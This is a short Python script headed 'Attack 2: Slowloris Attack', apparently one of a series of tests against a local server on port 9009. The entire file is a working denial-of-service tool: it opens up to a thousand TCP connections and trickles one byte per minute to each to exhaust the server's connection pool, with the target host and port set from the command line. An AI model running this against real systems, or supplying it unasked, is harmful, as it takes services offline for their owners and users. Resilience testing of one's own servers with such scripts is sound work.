#!/usr/bin/env python3
"""
Attack 2: Slowloris Attack
Opens many connections and sends data very slowly to hold them open indefinitely
"""

import socket
import time
import sys

def slowloris_attack(host='localhost', port=9009, connections=1000):
    """
    Slowloris attack: open many connections and send data very slowly
    to exhaust server connection pool
    """
    print(f"🚨 Slowloris Attack")
    print(f"Target: {host}:{port}")
    print(f"Connections: {connections}")
    print()
    
    sockets = []
    
    # Phase 1: Open connections
    print(f"Opening {connections} connections...")
    for i in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            sockets.append(s)
            
            if (i + 1) % 100 == 0:
                print(f"Opened {i + 1} connections...")
        except Exception as e:
            print(f"Failed to open connection {i}: {e}")
            break
    
    print(f"\n✅ Successfully opened {len(sockets)} connections")
    print("Holding connections open. Sending 1 byte per minute...")
    print("Press Ctrl+C to stop\n")
    
    # Phase 2: Hold connections by sending very slow data
    try:
        iteration = 0
        while True:
            iteration += 1
            print(f"[{time.strftime('%H:%M:%S')}] Iteration {iteration}: Sending 1 byte to {len(sockets)} connections...")
            
            active_sockets = []
            for s in sockets:
                try:
                    s.send(b'X')
                    active_sockets.append(s)
                except Exception as e:
                    # Connection closed, skip it
                    pass
            
            sockets = active_sockets
            print(f"Active connections: {len(sockets)}")
            
            if len(sockets) == 0:
                print("All connections closed by server!")
                break
            
            # Wait 60 seconds before sending next byte
            time.sleep(60)
            
    except KeyboardInterrupt:
        print("\n\n🛑 Attack stopped by user")
    finally:
        print("Closing all connections...")
        for s in sockets:
            try:
                s.close()
            except:
                pass
        print("Done!")

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9009
    connections = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
    
    slowloris_attack(host, port, connections)
